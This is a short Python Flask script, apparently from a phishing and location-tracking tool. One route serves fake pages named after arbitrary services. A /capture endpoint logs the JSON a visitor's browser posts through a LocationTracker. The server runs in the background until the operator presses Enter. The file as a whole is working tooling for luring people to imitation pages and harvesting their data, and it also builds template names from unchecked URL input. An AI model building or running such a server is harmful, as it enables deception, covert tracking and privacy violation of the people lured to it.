from flask import Flask, request, jsonify, render_template
from core.location_tracker import LocationTracker
import threading

app = Flask(__name__)
tracker = LocationTracker()

@app.route('/<service>')
def fake_page(service):
    return render_template(f"{service}.html")

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    tracker.log(data)
    return jsonify({"status": "success"})

def run_server():
    app.run(port=5000, debug=False)

if __name__ == "__main__":
    threading.Thread(target=run_server, daemon=True).start()
    input("Pressione Enter para encerrar...")